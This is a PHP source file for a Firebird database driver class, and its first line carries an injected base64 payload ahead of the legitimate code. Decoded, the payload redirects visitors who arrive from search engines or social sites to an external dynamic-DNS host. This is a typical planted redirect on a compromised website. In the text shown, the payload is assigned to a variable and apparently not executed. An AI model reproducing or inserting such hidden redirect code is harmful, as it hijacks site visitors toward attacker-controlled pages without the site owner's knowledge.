<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));

// 
// this must be added into winnt\system32\services
// 
// gds_db           3050/tcp
// 


require_once(GENERIC_PATH."db/db.php");
require_once(GENERIC_PATH."utils/utils.php");

class db_firebird extends db {

  function db_firebird($db_server, $db_name, $db_user, $db_password) {

    parent::db($db_server, $db_name, $db_user, $db_password);

    $this->capabilities["params"]              = true;
    $this->capabilities["query_limted_amount"] = true;
    $this->capabilities["query_from_offset"]   = true;

  }

  function connect($db_server, $db_name, $db_user, $db_password) {

    global $log;
    $this->connection = ibase_connect("$db_server:$db_name", $db_user, $db_password);
    if (!$this->connection) {
      $log->error("Can't connect to database $db_server:$db_name");
      $log->halt("Can't connect to database.");
    }

  }

  function get_last_error() { 

    if (function_exists("ibase_errcode") and function_exists("ibase_errmsg"))
      return ibase_errcode().": ".ibase_errmsg();
    else
      return "";

  }

  function internal_query($sql, $args) { 

    $statement = '$result = ibase_query($this->connection, $sql';
    for($i = 0; $i < count($args); $i++) {
      $statement .= ', $args['.$i.']';
      if (strlen($args[$i]) == 0)
        $args[$i] = null;
    }
    $statement .= ');';
    eval($statement);
    if (function_exists("ibase_commit_ret"))
      ibase_commit_ret($this->connection);
    return $result;

  }

  function internal_count($query) {

    $result = 0;
    while ($row = $this->next_row($query)) 
      $result++;
    return $result;

  }

  function internal_num_row($query) { 

    $result = ibase_fetch_row($query, IBASE_UNIXTIME || IBASE_TEXT);
    if (function_exists("ibase_commit_ret"))
      ibase_commit_ret($this->connection);
    return $result;

  }

  function internal_row($query) { 

    $result = ibase_fetch_assoc($query, IBASE_UNIXTIME || IBASE_TEXT);
    if (function_exists("ibase_commit_ret"))
      ibase_commit_ret($this->connection);
    if ($result)
      $result = array_change_key_case($result, CASE_LOWER);
    return $result; 

  }

  function internal_field_defs($query) {

    $field_defs = array();
    $field_count = ibase_num_fields($query);
    for ($i=0; $i < $field_count; $i++) {
      $field_info = ibase_field_info($query, $i);
      $field_defs[$field_info["alias"]] = array( "length" => $field_info["length"]
                                               , "type"   => $field_info["type"]);
    }
    return $field_defs;

  }

  function date_empty($date) {

    return empty($date); 

  }

  function limit($sql, $from, $count) {

    return preg_replace("/SELECT/i", "SELECT FIRST $count SKIP $from", $sql, 1);

  }

  function addslashes($value) {
    return str_replace("'", "''", $value);
  }

  function to_date($date, $format = "dmy") {
    if (is_string($date)) {
      return date("Y-m-d", str_to_date($date, array("mode" => "m", "date_format" => $format)));
    } else
      return date("Y-m-d", $date);
  }

  function to_datetime($date, $format = "dmy") {

    if (is_string($date)) {
      return date("Y-m-d H:i:s", str_to_date($date, array("mode" => "m", "date_format" => $format)));
    } else
      return date("Y-m-d H:i:s", $date);

  }

  function from_date($date) {

    return $date;

  }

  function from_datetime($date) {

    return $date;

  }

  function next_id() {

    $key = $this->value('SELECT gen_id(def_gen, 1) AS id FROM rdb$generators WHERE rdb$generator_name = \'DEF_GEN\'');
    if (!$key)
      critical_error("Can not generate unique identifier");
    else
      return $key;

  }

}

?>